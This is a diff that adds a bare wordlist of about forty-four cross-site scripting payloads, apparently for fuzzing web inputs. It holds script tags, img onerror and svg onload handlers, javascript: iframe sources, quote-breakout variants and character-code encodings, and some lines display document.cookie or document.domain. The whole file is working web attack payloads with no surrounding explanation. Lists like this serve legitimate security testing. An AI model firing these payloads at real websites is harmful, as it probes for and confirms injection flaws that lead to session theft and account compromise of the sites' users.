@@ -1,0 +1,44 @@
+<script>alert('XSS')</script>
+<img src=x onerror=alert('XSS')>
+"><script>alert('XSS')</script>
+"><img src=x onerror=alert('XSS')>
+<svg onload=alert('XSS')>
+<svg><script>alert('XSS')</script>
+<svg/onload=alert('XSS')>
+<marquee><img src=x onerror=alert('XSS')></marquee>
+<iframe src="javascript:alert('XSS')">
+<iframe src=javascript:alert('XSS')>
+<iframe src=javascript:alert&lpar;'XSS'&rpar;>
+<iframe src=javascript:confirm('XSS')>
+<iframe src=javascript:prompt('XSS')>
+<iframe src=javascript:alert(1)>
+<iframe src=javascript:alert(document.cookie)>
+"><img src=x onerror=alert(document.domain)>
+"><img src=x onerror=confirm('XSS')>
+"><img src=x onerror=prompt('XSS')>
+"><img src=x onerror=alert('XSS')>
+"><img src=x onerror=alert(/XSS/)>
+"><img src=x onerror=alert(/XSS/.source)>
+"><img src=x onerror=alert(String.fromCharCode(88,83,83))>
+"><img src=x onerror=alert(String.fromCharCode(88,83,83,46,102,111,111))>
+"><script>alert(1)</script>
+<svg/onload=alert(1)>
+<svg/onload=alert(2)>
+<svg/onload=alert(3)>
+<svg/onload=alert(4)>
+<svg/onload=alert(5)>
+<svg/onload=alert(6)>
+<svg/onload=alert(7)>
+<svg/onload=alert(8)>
+<svg/onload=alert(9)>
+<svg/onload=alert(10)>
+<img src=x onerror=alert(1)>
+<img src=x onerror=alert(2)>
+<img src=x onerror=alert(3)>
+<img src=x onerror=alert(4)>
+<img src=x onerror=alert(5)>
+<img src=x onerror=alert(6)>
+<img src=x onerror=alert(7)>
+<img src=x onerror=alert(8)>
+<img src=x onerror=alert(9)>
+<img src=x onerror=alert(10)>
